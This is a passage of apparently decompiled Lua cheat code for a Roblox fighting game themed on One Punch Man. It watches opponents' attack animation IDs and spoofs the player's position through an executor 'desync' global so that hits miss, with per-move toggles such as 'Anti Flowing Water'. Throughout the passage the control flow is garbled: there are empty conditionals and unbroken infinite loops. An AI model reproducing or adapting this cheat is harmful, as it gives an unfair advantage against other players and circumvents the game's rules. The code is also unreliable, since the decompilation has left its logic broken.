                                                if tmp1162 == nil then
                                                    break
                                                end
                                                tmp1163:Disconnect()
                                            end
                                        end
                                    end
                                end
                                if playedAnimId:match("12272894215") and rawget(Options.AntiMoves_Garou.Value, "Anti Flowing Water") then
                                    local tmp1164 = Instance.new("Part", Workspace)
                                    tmp1164.Anchored = true
                                    tmp1164.Size = Vector3.new(10, 5, 10)
                                    tmp1164.CanCollide = false
                                    tmp1164.Transparency = 1
                                    local up1165 = false
                                    local tmp1167 = tmp1164.Touched:Connect(function(arg1166)
                                        if arg1166 == root then
                                            up1165 = true
                                        end
                                    end)
                                    local tmp1169 = tmp1164.TouchEnded:Connect(function(arg1168)
                                        if arg1168 == root then
                                            up1165 = false
                                        end
                                    end)
                                    if up1093 then
                                        tmp1164.CFrame = targetRoot.CFrame * CFrame.new(0, 0, - tmp1164.Size.Z / 2)
                                        task.wait()
                                        if up1165 and not isCountering(hum) then
                                            bdcancel()
                                        end
                                        tmp1164:Destroy()
                                        tmp1167:Disconnect()
                                        tmp1169:Disconnect()
                                        return
                                    end
                                    local tmp1170 = tick()
                                    local tmp1171 = up1165
                                    while true do
                                        if true then
                                            if antidebug then
                                                warn("[ANTI DEBUG] FLOWING WATER")
                                            end
                                            tmp1164.CFrame = targetRoot.CFrame * CFrame.new(0, 0, - tmp1164.Size.Z / 2)
                                            if tmp1171 ~= true or isCountering(hum) then
                                            end
                                            while true do
                                                if antidebug then
                                                    warn("[ANTI DEBUG] FLOWING WATER")
                                                end
                                                tmp1164.CFrame = targetRoot.CFrame * CFrame.new(0, 0, - tmp1164.Size.Z / 2)
                                                getgenv().desync = {
                                                    CFrame = CFrame.new(9000000000, 9000000000, 9000000000)
                                                }
                                                task.wait()
                                                if tmp1171 == false or (tick() >= tmp1170 + 0.5 or (not playedAnim.IsPlaying or isCountering(hum))) then
                                                    getgenv().desync = nil
                                                end
                                            end
                                        end
                                        RenderStepped:Wait()
                                        if tick() >= tmp1170 + 0.5 or not playedAnim.IsPlaying then
                                            getgenv().desync = nil
                                            if tmp1164 then
                                                tmp1164:Destroy()
                                            end
                                            tmp1167:Disconnect()
                                            tmp1169:Disconnect()
                                        end
                                    end
                                end
                                if playedAnimId:match("12273188754") and rawget(Options.AntiMoves_Garou.Value, "Anti Flowing Water") then
                                    local tmp1172 = Instance.new("Part", Workspace)
                                    tmp1172.Anchored = true
                                    tmp1172.Size = Vector3.new(15, 5, 15)
                                    tmp1172.CanCollide = false
                                    tmp1172.Transparency = 1
                                    local up1173 = false
                                    local tmp1175 = tmp1172.Touched:Connect(function(arg1174)
                                        if arg1174 == root then
                                            up1173 = true
                                        end
                                    end)
                                    local tmp1177 = tmp1172.TouchEnded:Connect(function(arg1176)
                                        if arg1176 == root then
                                            up1173 = false
                                        end
                                    end)
                                    local tmp1178 = tick()
                                    local tmp1179 = up1173
                                    while true do
                                        if true then
                                            if antidebug then
                                                warn("[ANTI DEBUG] FLOWING WATER HIT")
                                            end
                                            tmp1172.CFrame = targetRoot.CFrame * CFrame.new(0, 0, - tmp1172.Size.Z / 2)
                                            if tmp1179 ~= true or isCountering(hum) then
                                            end
                                            while true do
                                                if antidebug then
                                                    warn("[ANTI DEBUG] FLOWING WATER HIT")
                                                end
                                                tmp1172.CFrame = targetRoot.CFrame * CFrame.new(0, 0, - tmp1172.Size.Z / 2)
                                                getgenv().desync = {
                                                    CFrame = CFrame.new(9000000000, 9000000000, 9000000000)
                                                }
                                                task.wait()
                                                if tmp1179 == false or (tick() >= tmp1178 + 2 or (not playedAnim.IsPlaying or isCountering(hum))) then
                                                    getgenv().desync = nil
                                                end
                                            end
                                        end
                                        RenderStepped:Wait()
                                        if tick() >= tmp1178 + 2 or not playedAnim.IsPlaying then
                                            getgenv().desync = nil
                                            if tmp1172 then
                                                tmp1172:Destroy()
                                            end
                                            tmp1175:Disconnect()
                                            tmp1177:Disconnect()
                                        end
                                    end
                                end
                                if playedAnimId:match("14374357351") and rawget(Options.AntiMoves_Garou.Value, "Anti Flowing Water") then
                                    local tmp1180 = Instance.new("Part", Workspace)
                                    tmp1180.Anchored = true
                                    tmp1180.Size = Vector3.new(10, 5, 15)
                                    tmp1180.CanCollide = false
                                    tmp1180.Transparency = 1
                                    local up1181 = false
                                    local tmp1183 = tmp1180.Touched:Connect(function(arg1182)
                                        if arg1182 == root then
                                            up1181 = true
                                        end
                                    end)
                                    local tmp1185 = tmp1180.TouchEnded:Connect(function(arg1184)
                                        if arg1184 == root then
                                            up1181 = false
                                        end
                                    end)
                                    local tmp1186 = tick()
                                    local tmp1187 = up1181
                                    while true do
                                        if true then
                                            if antidebug then
                                                warn("[ANTI DEBUG] FLOWING WATER FINISHER")
                                            end
                                            tmp1180.CFrame = targetRoot.CFrame * CFrame.new(0, 0, - tmp1180.Size.Z / 2)
                                            if tmp1187 ~= true or isCountering(hum) then
                                            end
                                            while true do
                                                if antidebug then
                                                    warn("[ANTI DEBUG] FLOWING WATER FINISHER")
                                                end
                                                tmp1180.CFrame = targetRoot.CFrame * CFrame.new(0, 0, - tmp1180.Size.Z / 2)
                                                getgenv().desync = {
                                                    CFrame = CFrame.new(9000000000, 9000000000, 9000000000)
                                                }
                                                task.wait()
                                                if tmp1187 == false or (tick() >= tmp1186 + 1.5 or (not playedAnim.IsPlaying or isCountering(hum))) then
                                                    getgenv().desync = nil
                                                end
                                            end
                                        end
                                        RenderStepped:Wait()
                                        if tick() >= tmp1186 + 1.5 or not playedAnim.IsPlaying then
                                            getgenv().desync = nil
                                            if tmp1180 then
                                                tmp1180:Destroy()
                                            end
                                            tmp1183:Disconnect()
                                            tmp1185:Disconnect()
                                            task.wait(0.5)
                                            while true do
                                                if true then
                                                    if antidebug then
                                                        warn("[ANTI DEBUG] FLOWING WATER FINISHER")
                                                    end
                                                    if (root.Position - targetRoot.Position).Magnitude > 25 then
                                                    end
                                                    while true do
                                                        if antidebug then
                                                            warn("[ANTI DEBUG] FLOWING WATER FINISHER")
                                                        end
                                                        getgenv().desync = {
                                                            CFrame = CFrame.new(9000000000, 9000000000, 9000000000)
                                                        }
                                                        task.wait()
                                                        if (root.Position - targetRoot.Position).Magnitude > 25 or tick() >= tmp1186 + 2.75 then
                                                            getgenv().desync = nil
                                                        end
                                                    end
                                                end
                                                task.wait()
                                                if tick() >= tmp1186 + 2.75 then
                                                    getgenv().desync = nil
                                                end
                                            end
                                        end
                                    end
                                end
                                if playedAnimId:match("12296882427") and rawget(Options.AntiMoves_Garou.Value, "Anti Lethal Whirlwind Stream") then
                                    if up1093 and ((root.Position - (targetRoot.CFrame * CFrame.new(0, 0, - 2.5)).Position).Magnitude <= 10 and not isCountering(hum)) then
                                        bdcancel()
                                        return
                                    end
                                    local tmp1188 = tick()
                                    while true do
                                        if true then
                                            if antidebug then
                                                warn("[ANTI DEBUG] LETHAL WHIRLWIND STREAM")
                                            end
                                            if (root.Position - (targetRoot.CFrame * CFrame.new(0, 0, - 2.5)).Position).Magnitude > 10 or isCountering(hum) then
                                            end
                                            while true do
                                                if antidebug then
                                                    warn("[ANTI DEBUG] LETHAL WHIRLWIND STREAM")
                                                end
                                                getgenv().desync = {
                                                    CFrame = CFrame.new(9000000000, 9000000000, 9000000000)
                                                }
                                                task.wait()
                                                if (root.Position - (targetRoot.CFrame * CFrame.new(0, 0, - 2.5)).Position).Magnitude > 10 or (tick() >= tmp1188 + 0.5 or isCountering(hum)) then
                                                    getgenv().desync = nil
                                                end
                                            end
                                        end
                                        task.wait()
                                        if tick() >= tmp1188 + 0.5 then
                                            getgenv().desync = nil
                                        end
                                    end
                                end
                                if playedAnimId:match("12296113986") and rawget(Options.AntiMoves_Garou.Value, "Anti Lethal Whirlwind Stream") then
                                    task.delay(1.35, function()
                                        local tmp1189 = tick()
                                        while true do
                                            if antidebug then
                                                warn("[ANTI DEBUG] LETHAL WHIRLWIND STREAM HIT")
                                            end
                                            if (root.Position - targetRoot.Position).Magnitude <= 15 then
                                                break
                                            end
                                            task.wait()
                                            if tick() >= tmp1189 + 0.65 then
                                                getgenv().desync = nil
                                                return
                                            end
                                        end
                                        while true do
                                            if antidebug then
                                                warn("[ANTI DEBUG] LETHAL WHIRLWIND STREAM HIT")
                                            end
                                            getgenv().desync = {
                                                CFrame = CFrame.new(9000000000, 9000000000, 9000000000)
                                            }
                                            task.wait()
                                            if (root.Position - targetRoot.Position).Magnitude > 15 or tick() >= tmp1189 + 0.65 then
                                                getgenv().desync = nil
                                            end
                                        end
                                    end)
                                    local tmp1190 = tick()
                                    if (root.Position - targetRoot.Position).Magnitude > 15 then
                                    end
                                    while true do
                                        if antidebug then
                                            warn("[ANTI DEBUG] LETHAL WHIRLWIND STREAM HIT")
                                        end
                                        getgenv().desync = {
                                            CFrame = CFrame.new(9000000000, 9000000000, 9000000000)
                                        }
                                        task.wait()
                                        if tick() >= tmp1190 + 0.5 then
                                            getgenv().desync = nil
                                        end
                                    end
                                end
                                if playedAnimId:match("14798608838") and rawget(Options.AntiMoves_Garou.Value, "Anti Lethal Whirlwind Stream") then
                                    task.delay(0.75, function()
                                        local tmp1191 = tick()
                                        while true do
                                            if antidebug then
                                                warn("[ANTI DEBUG] LETHAL WHIRLWIND STREAM FINISHER")
                                            end
                                            if (root.Position - targetRoot.Position).Magnitude <= 25 then
                                                break
                                            end
                                            task.wait()
                                            if tick() >= tmp1191 + 0.75 then
                                                getgenv().desync = nil
                                                return
                                            end
                                        end
                                        while true do
                                            if antidebug then
                                                warn("[ANTI DEBUG] LETHAL WHIRLWIND STREAM FINISHER")
                                            end
                                            getgenv().desync = {
                                                CFrame = CFrame.new(9000000000, 9000000000, 9000000000)
                                            }
                                            task.wait()
                                            if (root.Position - targetRoot.Position).Magnitude > 25 or tick() >= tmp1191 + 0.75 then
                                                getgenv().desync = nil
                                            end
                                        end
                                    end)
                                end
                                if playedAnimId:match("12307656616") and rawget(Options.AntiMoves_Garou.Value, "Anti Hunters Grasp") then
                                    local tmp1192 = tick()
                                    while true do
                                        if true then
                                            if antidebug then
                                                warn("[ANTI DEBUG] HUNTERS GRASP")
                                            end
                                            if (root.Position - (targetRoot.CFrame * CFrame.new(0, 0, - 2.5)).Position).Magnitude > 10 or isCountering(hum) then
                                            end
                                            while true do
                                                if antidebug then
                                                    warn("[ANTI DEBUG] HUNTERS GRASP")
                                                end
                                                getgenv().desync = {
                                                    CFrame = CFrame.new(9000000000, 9000000000, 9000000000)
                                                }
                                                task.wait()
                                                if (root.Position - (targetRoot.CFrame * CFrame.new(0, 0, - 2.5)).Position).Magnitude > 10 or (tick() >= tmp1192 + 0.35 or isCountering(hum)) then
                                                    getgenv().desync = nil
                                                end
                                            end
                                        end
                                        task.wait()
                                        if tick() >= tmp1192 + 0.35 then
                                            getgenv().desync = nil
                                        end
                                    end
                                end
                                if playedAnimId:match("13603396939") and rawget(Options.AntiMoves_Garou.Value, "Anti Preys Peril") then
                                    local tmp1193 = tick()
                                    while true do
                                        if true then
                                            if antidebug then
                                                warn("[ANTI DEBUG] 2")
                                            end
                                            if (root.Position - (targetRoot.CFrame * CFrame.new(0, 0, - 1)).Position).Magnitude > 7.5 then
                                            end
                                            while true do
                                                if true then
                                                    if antidebug then
                                                        warn("[ANTI DEBUG] 2")
                                                    end
                                                    if isCountering(hum) then
                                                    end
                                                    while true do
                                                        if antidebug then
                                                            warn("[ANTI DEBUG] 2")
                                                        end
                                                        getgenv().desync = {
                                                            CFrame = CFrame.new(9000000000, 9000000000, 9000000000)
                                                        }
                                                        task.wait()
                                                        if isCountering(hum) or ((root.Position - (targetRoot.CFrame * CFrame.new(0, 0, - 1)).Position).Magnitude > 7.5 or tick() >= tmp1193 + 2.5) then
                                                            getgenv().desync = nil
                                                        end
                                                    end
                                                end
                                                task.wait()
                                                if (root.Position - (targetRoot.CFrame * CFrame.new(0, 0, - 1)).Position).Magnitude > 7.5 or tick() >= tmp1193 + 2.5 then
                                                    getgenv().desync = nil
                                                end
                                            end
                                        end
                                        task.wait()
                                        if tick() >= tmp1193 + 2.75 then
                                            getgenv().desync = nil
                                        end
                                    end
                                end
                                if playedAnimId:match("16515850153") and rawget(Options.AntiMoves_Tatsumaki.Value, "Anti Windstorm Fury") then
                                    task.spawn(function()
                                        if (root.Position - targetRoot.Position).Magnitude <= 15 then
                                            getgenv().desync = {
                                                CFrame = CFrame.new(9000000000, 9000000000, 9000000000)
                                            }
                                        end
                                        local tmp1194 = debrisFolder:WaitForChild("Dotted", 1)
                                        if tmp1194 then
                                            local tmp1195 = tmp1194:WaitForChild("Dots", 1)
                                            if not tmp1195 then
                                            end
                                            local tmp1196 = tick()
                                            if (root.Position - tmp1195.Position).Magnitude > 20 then
                                                getgenv().desync = nil
                                            end
                                            while true do
                                                if true then
                                                    if antidebug then
                                                        warn("[ANTI DEBUG] 3")
                                                    end
                                                    if (root.Position - tmp1195.Position).Magnitude > 20 or isDeathCountering(char) then
                                                    end
                                                    while true do
                                                        if antidebug then
                                                            warn("[ANTI DEBUG] 3")
                                                        end
                                                        getgenv().desync = {
                                                            CFrame = CFrame.new(9000000000, 9000000000, 9000000000)
                                                        }
                                                        task.wait()
                                                        if (root.Position - tmp1195.Position).Magnitude > 20 or (tick() >= tmp1196 + 4.25 or isDeathCountering(char)) then
                                                            getgenv().desync = nil
                                                        end
                                                    end
                                                end
                                                task.wait()
                                                if tick() >= tmp1196 + 4.25 then
                                                    getgenv().desync = nil
                                                end
                                            end
                                        else
                                            if not tmp1194 then
                                                getgenv().desync = nil
                                            end
                                            return
                                        end
                                    end)
                                end
                                if playedAnimId:match("16431491215") and rawget(Options.AntiMoves_Tatsumaki.Value, "Anti Stone Grave") then
                                    task.spawn(function()
                                        local tmp1197 = tick()
                                        while true do
                                            if antidebug then
                                                warn("[ANTI DEBUG] 4")
                                            end
                                            if (root.Position - (targetRoot.CFrame * CFrame.new(0, 0, - 25)).Position).Magnitude <= 25 and not isCountering(hum) then
                                                break
                                            end
                                            task.wait()
                                            if tick() >= tmp1197 + 0.75 then
                                                getgenv().desync = nil
                                                return
                                            end
                                        end
                                        while true do
                                            if antidebug then
                                                warn("[ANTI DEBUG] 4")
                                            end
                                            getgenv().desync = {
                                                CFrame = CFrame.new(9000000000, 9000000000, 9000000000)
                                            }
                                            task.wait()
                                            if (root.Position - (targetRoot.CFrame * CFrame.new(0, 0, - 20)).Position).Magnitude > 25 or (tick() >= tmp1197 + 0.75 or isCountering(hum)) then
                                                getgenv().desync = nil
                                            end
                                        end
                                    end)
                                end
                                if playedAnimId:match("16597912086") and rawget(Options.AntiMoves_Tatsumaki.Value, "Anti Expulsive Push") then
                                    local tmp1198 = tick()
                                    while true do
                                        if true then
                                            if antidebug then
                                                warn("[ANTI DEBUG] 5")
                                            end
                                            if (root.Position - targetRoot.Position).Magnitude > 15 or isCountering(hum) then
                                            end
                                            while true do
                                                if antidebug then
                                                    warn("[ANTI DEBUG] 5")
                                                end
                                                getgenv().desync = {
                                                    CFrame = CFrame.new(9000000000, 9000000000, 9000000000)
                                                }
                                                task.wait()
                                                if (root.Position - targetRoot.Position).Magnitude > 15 or (tick() >= tmp1198 + 0.75 or isCountering(hum)) then
                                                    getgenv().desync = nil
                                                end
                                            end
                                        end
                                        task.wait()
                                        if tick() >= tmp1198 + 0.75 then
                                            getgenv().desync = nil
                                        end
                                    end
                                end
                                if playedAnimId:match("13813955149") and Toggles.AntiMoves_Trashcan.Value then
                                    if (root.Position - targetRoot.Position).Magnitude <= 25 then
                                        if up1093 then
                                            bdcancel()
                                            repeat
                                                task.wait()
                                            until tick() >= start + 2
                                        else
                                            getgenv().desync = {
                                                CFrame = CFrame.new(9000000000, 9000000000, 9000000000)
                                            }
                                            task.wait(0.75)
                                            getgenv().desync = nil
                                        end
                                    end
                                    local up1199 = nil
                                    up1199 = debrisFolder.ChildAdded:Connect(function(arg1200)
                                        if arg1200:IsA("MeshPart") and arg1200.Name:lower() == "trash can" then
                                            up1199:Disconnect()
                                            local tmp1201 = tick()
                                            while true do
                                                if true then
                                                    if antidebug then
                                                        warn("[ANTI DEBUG] 6")
                                                    end
                                                    if (root.Position - arg1200.Position).Magnitude > 25 then
                                                    end
                                                    if up1093 then
                                                        bdcancel()
                                                        task.wait()
                                                        if tick() < tmp1201 + 2 then
                                                        end
                                                    end
                                                    while true do
                                                        if antidebug then
                                                            warn("[ANTI DEBUG] 6")
                                                        end
                                                        getgenv().desync = {
                                                            CFrame = CFrame.new(9000000000, 9000000000, 9000000000)
                                                        }
                                                        task.wait()
                                                        if (root.Position - arg1200.Position).Magnitude > 25 or tick() >= tmp1201 + 2 then
                                                            getgenv().desync = nil
                                                        end
                                                    end
                                                end
                                                task.wait()
                                                if tick() >= tmp1201 + 2 then
                                                    getgenv().desync = nil
                                                end
                                            end
                                        else
                                            return
                                        end
                                    end)
                                end
                                if playedAnimId:match("11365563255") and targetChar:GetAttribute("Ulted") ~= nil then
                                    MoveNotify(plr, "Table Flip")
                                    task.delay(1, function()
                                        if targetChar:FindFirstChild("AbsoluteImmortal", true) and targetChar:FindFirstChild("Freeze") then
                                            task.wait(3)
                                            if not rawget(Options.AntiMoves_Saitama.Value, "Anti Table Flip") then
                                            end
                                            local tmp1202 = tick()
                                            while true do
                                                if antidebug then
                                                    warn("[ANTI DEBUG] 7")
                                                end
                                                getgenv().desync = {
                                                    CFrame = CFrame.new(9000000000, 9000000000, 9000000000)
                                                }
                                                task.wait()
                                                if tick() >= tmp1202 + 2.5 then
                                                    getgenv().desync = nil
                                                end
                                            end
                                        else
                                            return
                                        end
                                    end)
                                end
                                if playedAnimId:match("12983333733") and targetChar:GetAttribute("Ulted") ~= nil then
                                    MoveNotify(plr, "Serious Punch")
                                    task.delay(1, function()
                                        if targetChar:FindFirstChild("AbsoluteImmortal", true) and targetChar:FindFirstChild("Freeze") then
                                            task.wait(4.25)
                                            if not rawget(Options.AntiMoves_Saitama.Value, "Anti Serious Punch") then
                                            end
                                            local tmp1203 = tick()
                                            while true do
                                                if antidebug then
                                                    warn("[ANTI DEBUG] 8")
                                                end
                                                getgenv().desync = {
                                                    CFrame = CFrame.new(9000000000, 9000000000, 9000000000)
                                                }
                                                task.wait()
                                                if tick() >= tmp1203 + 2 then
                                                    getgenv().desync = nil
                                                end
                                            end
                                        else
                                            return
                                        end
                                    end)
                                end
                                if playedAnimId:match("13927612951") and targetChar:GetAttribute("Ulted") ~= nil then
                                    MoveNotify(plr, "Omni-Directional Punch")
                                    if not rawget(Options.AntiMoves_Saitama.Value, "Anti Omni-Directional Punch") then
                                    end
                                    local tmp1204 = tick()
                                    while true do
                                        if true then
                                            if antidebug then
                                                warn("[ANTI DEBUG] 9")
                                            end
                                            if (root.Position - targetRoot.Position).Magnitude > 150 then
                                            end
                                            while true do
                                                if antidebug then
                                                    warn("[ANTI DEBUG] 9")
                                                end
                                                getgenv().desync = {
                                                    CFrame = CFrame.new(9000000000, 9000000000, 9000000000)
                                                }
                                                task.wait()
                                                if (root.Position - targetRoot.Position).Magnitude > 150 or tick() >= tmp1204 + 2.5 then
                                                    getgenv().desync = nil
                                                end
                                            end
                                        end
                                        task.wait()
                                        if tick() >= tmp1204 + 2.5 then
                                            getgenv().desync = nil
                                        end
                                    end
                                end
                                if playedAnimId:match("14719290328") and rawget(Options.AntiMoves_MetalBat.Value, "Anti Savage Tornado") then
                                    if (root.Position - targetRoot.Position).Magnitude <= 50 then
                                        getgenv().desync = {
                                            CFrame = CFrame.new(9000000000, 9000000000, 9000000000)
                                        }
                                    end
                                    task.wait(0.5)
                                    if playedAnim.IsPlaying then
                                        local tmp1205 = tick()
                                        if (root.Position - targetRoot.Position).Magnitude > 50 then
                                            getgenv().desync = nil
                                        end
                                        while true do
                                            if true then
                                                if antidebug then
                                                    warn("[ANTI DEBUG] 10")
                                                end
                                                if (root.Position - targetRoot.Position).Magnitude <= 50 and not isDeathCountering(char) then
                                                    while true do
                                                        if antidebug then
                                                            warn("[ANTI DEBUG] 10")
                                                        end
                                                        getgenv().desync = {
                                                            CFrame = CFrame.new(9000000000, 9000000000, 9000000000)
                                                        }
                                                        task.wait()
                                                        if (root.Position - targetRoot.Position).Magnitude > 50 or (tick() >= tmp1205 + 3.5 or isDeathCountering(char)) then
                                                            getgenv().desync = nil
                                                        end
                                                    end
                                                end
                                            end
                                            task.wait()
                                            if tick() >= tmp1205 + 3.5 then
                                                getgenv().desync = nil
                                            end
                                        end
                                    end
                                    if not playedAnim.IsPlaying then
                                        getgenv().desync = nil
                                    end
                                end
                                if playedAnimId:match("17275150809") and rawget(Options.AntiMoves_Tatsumaki.Value, "Anti Terrible Tornado") then
                                    local tmp1206 = tick()
                                    while true do
                                        if true then
                                            if antidebug then
                                                warn("[ANTI DEBUG] 11")
                                            end
                                            if (root.Position - targetRoot.Position).Magnitude > 50 then
                                            end
                                            while true do
                                                if antidebug then
                                                    warn("[ANTI DEBUG] 11")
                                                end
                                                getgenv().desync = {
                                                    CFrame = CFrame.new(9000000000, 9000000000, 9000000000)
                                                }
                                                task.wait()
                                                if (root.Position - targetRoot.Position).Magnitude > 50 or tick() >= tmp1206 + 1 then
                                                    getgenv().desync = nil
                                                end
                                            end
                                        end
                                        task.wait()
                                        if tick() >= tmp1206 + 1 then
                                            getgenv().desync = nil
                                        end
                                    end
                                end
                                if playedAnimId:match("15128849047") and rawget(Options.AntiMoves_MetalBat.Value, "Anti Death Blow") then
                                    MoveNotify(plr, "Death Blow")
                                    local tmp1207 = tick()
                                    while true do
                                        if true then
                                            if antidebug then
                                                warn("[ANTI DEBUG] 12")
                                            end
                                            if (root.Position - targetRoot.Position).Magnitude > 100 then
                                            end
                                            while true do
                                                if antidebug then
                                                    warn("[ANTI DEBUG] 12")
                                                end
                                                getgenv().desync = {
                                                    CFrame = CFrame.new(9000000000, 9000000000, 9000000000)
                                                }
                                                task.wait()
                                                if (root.Position - targetRoot.Position).Magnitude > 100 or (isAnimPlaying(targetHum, "15123665491") or tick() >= tmp1207 + 3) then
                                                    getgenv().desync = nil
                                                end
                                            end
                                        end
                                        task.wait()
                                        if isAnimPlaying(targetHum, "15123665491") or tick() >= tmp1207 + 3 then
                                            getgenv().desync = nil
                                        end
                                    end
                                end
                                if playedAnimId:match("13376869471") and rawget(Options.AntiMoves_Sonic.Value, "Anti Flash Strike") then
                                    local tmp1208 = Instance.new("Part", Workspace)
                                    tmp1208.Anchored = true
                                    tmp1208.Size = Vector3.new(10, 7.5, 60)
                                    tmp1208.CanCollide = false
                                    tmp1208.Transparency = 0
                                    local up1209 = false
                                    local tmp1211 = tmp1208.Touched:Connect(function(arg1210)
                                        if arg1210 == root then
                                            up1209 = true
                                        end
                                    end)
                                    local tmp1213 = tmp1208.TouchEnded:Connect(function(arg1212)
                                        if arg1212 == root then
                                            up1209 = false
                                        end
                                    end)
                                    local tmp1214 = tick()
                                    local tmp1215 = up1209
                                    while true do
                                        if true then
                                            if antidebug then
                                                warn("[ANTI DEBUG] FLASH STRIKE")
                                            end
                                            tmp1208.CFrame = targetRoot.CFrame * CFrame.new(0, 0, - tmp1208.Size.Z / 2)
                                            if tmp1215 == true and not isCountering(hum) then
                                                while true do
                                                    if antidebug then
                                                        warn("[ANTI DEBUG] FLASH STRIKE")
                                                    end
                                                    tmp1208.CFrame = targetRoot.CFrame * CFrame.new(0, 0, - tmp1208.Size.Z / 2)
                                                    getgenv().desync = {
                                                        CFrame = CFrame.new(9000000000, 9000000000, 9000000000)
                                                    }
                                                    task.wait()
                                                    if tmp1215 == false or (tick() >= tmp1214 + 0.8 or (not playedAnim.IsPlaying or isCountering(hum))) then
                                                        getgenv().desync = nil
                                                    end
                                                end
                                            end
                                        end
                                        RenderStepped:Wait()
                                        if tick() >= tmp1214 + 0.8 or not playedAnim.IsPlaying then
                                            getgenv().desync = nil
                                            if tmp1208 then
                                                tmp1208:Destroy()
                                            end
                                            tmp1211:Disconnect()
                                            tmp1213:Disconnect()
                                        end
                                    end
                                end
                                if playedAnimId:match("13294790250") and rawget(Options.AntiMoves_Sonic.Value, "Anti Whirlwind Kick") then
                                    task.wait(0.5)
                                    local tmp1216 = tick()
                                    while true do
                                        if true then
                                            if antidebug then
                                                warn("[ANTI DEBUG] WHIRLWIND KICK")
                                            end
                                            if (root.Position - (targetRoot.CFrame * CFrame.new(0, 0, - 2.5)).Position).Magnitude <= 10 and not isCountering(hum) then
                                                while true do
                                                    if antidebug then
                                                        warn("[ANTI DEBUG] WHIRLWIND KICK")
                                                    end
                                                    getgenv().desync = {
                                                        CFrame = CFrame.new(9000000000, 9000000000, 9000000000)
                                                    }
                                                    task.wait()
                                                    if (root.Position - (targetRoot.CFrame * CFrame.new(0, 0, - 2.5)).Position).Magnitude > 10 or (tick() >= tmp1216 + 0.75 or isCountering(hum)) then
                                                        getgenv().desync = nil
                                                    end
                                                end
                                            end
                                        end
                                        task.wait()
                                        if tick() >= tmp1216 + 0.75 then
                                            getgenv().desync = nil
                                        end
                                    end
                                end
                                if playedAnimId:match("13632347366") and rawget(Options.AntiMoves_Sonic.Value, "Anti Twinblade Rush") then
                                    local tmp1217 = tick()
                                    while true do
                                        if true then
                                            if antidebug then
                                                warn("[ANTI DEBUG] 13")
                                            end
                                            if (root.Position - targetRoot.Position).Magnitude <= 75 and not isDeathCountering(char) then
                                                while true do
                                                    if antidebug then
                                                        warn("[ANTI DEBUG] 13")
                                                    end
                                                    getgenv().desync = {
                                                        CFrame = CFrame.new(9000000000, 9000000000, 9000000000)
                                                    }
                                                    task.wait()
                                                    if (root.Position - targetRoot.Position).Magnitude > 75 or (not playedAnim.IsPlaying or (tick() >= tmp1217 + 1.75 or isDeathCountering(char))) then
                                                        getgenv().desync = nil
                                                    end
                                                end
                                            end
                                        end
                                        task.wait()
                                        if not playedAnim.IsPlaying or tick() >= tmp1217 + 1.75 then
                                            getgenv().desync = nil
                                        end
                                    end
                                end
                                if playedAnimId:match("13881335713") and rawget(Options.AntiMoves_Sonic.Value, "Anti Fourfold Flashstrike") then
                                    task.wait(0.75)
                                    if not playedAnim.IsPlaying then
                                    end
                                    local tmp1218 = Instance.new("Part", Workspace)
                                    tmp1218.Anchored = true
                                    tmp1218.Size = Vector3.new(35, 5, 60)
                                    tmp1218.CanCollide = false
                                    tmp1218.Transparency = 1
                                    local up1219 = false
                                    local tmp1221 = tmp1218.Touched:Connect(function(arg1220)
                                        if arg1220 == root then
                                            up1219 = true
                                        end
                                    end)
                                    local tmp1223 = tmp1218.TouchEnded:Connect(function(arg1222)
                                        if arg1222 == root then
                                            up1219 = false
                                        end
                                    end)
                                    local tmp1224 = tick()
                                    local tmp1225 = up1219
                                    while true do
                                        if true then
                                            if antidebug then
                                                warn("[ANTI DEBUG] FOURFOLD FLASHSTRIKE")
                                            end
                                            tmp1218.CFrame = targetRoot.CFrame * CFrame.new(0, 0, - tmp1218.Size.Z / 2)
                                            if tmp1225 == true and not isDeathCountering(char) then
                                                while true do
                                                    if antidebug then
                                                        warn("[ANTI DEBUG] FOURFOLD FLASHSTRIKE")
                                                    end
                                                    tmp1218.CFrame = targetRoot.CFrame * CFrame.new(0, 0, - tmp1218.Size.Z / 2)
                                                    getgenv().desync = {
                                                        CFrame = CFrame.new(9000000000, 9000000000, 9000000000)
                                                    }
                                                    task.wait()
                                                    if tmp1225 == false or (tick() >= tmp1224 + 0.75 or (not playedAnim.IsPlaying or isDeathCountering(char))) then
                                                        getgenv().desync = nil
                                                    end
                                                end
                                            end
                                        end
                                        RenderStepped:Wait()
                                        if tick() >= tmp1224 + 0.75 or not playedAnim.IsPlaying then
                                            getgenv().desync = nil
                                            if tmp1218 then
                                                tmp1218:Destroy()
                                            end
                                            tmp1221:Disconnect()
                                            tmp1223:Disconnect()
                                        end
                                    end
                                end
                                if playedAnimId:match("13723174078") and rawget(Options.AntiMoves_Sonic.Value, "Anti Carnage") then
                                    task.wait(0.5)
                                    if not playedAnim.IsPlaying then
                                    end
                                    local tmp1226 = Instance.new("Part", Workspace)
                                    tmp1226.Anchored = true
                                    tmp1226.Size = Vector3.new(35, 50, 250)
                                    tmp1226.CanCollide = false
                                    tmp1226.Transparency = 1
                                    local up1227 = false
                                    local tmp1229 = tmp1226.Touched:Connect(function(arg1228)
                                        if arg1228 == root then
                                            up1227 = true
                                        end
                                    end)
                                    local tmp1231 = tmp1226.TouchEnded:Connect(function(arg1230)
                                        if arg1230 == root then
                                            up1227 = false
                                        end
                                    end)
                                    local tmp1232 = tick()
                                    local tmp1233 = up1227
                                    while true do
                                        if true then
                                            if antidebug then
                                                warn("[ANTI DEBUG] CARNAGE")
                                            end
                                            tmp1226.CFrame = targetRoot.CFrame * CFrame.new(0, - tmp1226.Size.Y / 2, - tmp1226.Size.Z / 2)
                                            if tmp1233 == true and not isDeathCountering(char) then
                                                while true do
                                                    if antidebug then
                                                        warn("[ANTI DEBUG] CARNAGE")
                                                    end
                                                    tmp1226.CFrame = targetRoot.CFrame * CFrame.new(0, - tmp1226.Size.Y / 2, - tmp1226.Size.Z / 2)
                                                    getgenv().desync = {
                                                        CFrame = CFrame.new(9000000000, 9000000000, 9000000000)
                                                    }
                                                    task.wait()
                                                    if tmp1233 == false or (tick() >= tmp1232 + 2.5 or (not playedAnim.IsPlaying or isDeathCountering(char))) then
                                                        getgenv().desync = nil
                                                    end
                                                end
                                            end
                                        end
                                        RenderStepped:Wait()
                                        if tick() >= tmp1232 + 2.5 or not playedAnim.IsPlaying then
                                            getgenv().desync = nil
                                            if tmp1226 then
                                                tmp1226:Destroy()
                                            end
                                            tmp1229:Disconnect()
                                            tmp1231:Disconnect()
                                        end
                                    end
                                end
                                if playedAnimId:match("14721837245") and rawget(Options.AntiMoves_Genos.Value, "Anti Thunder Kick") then
                                    local tmp1234 = tick()
                                    while true do
                                        if true then
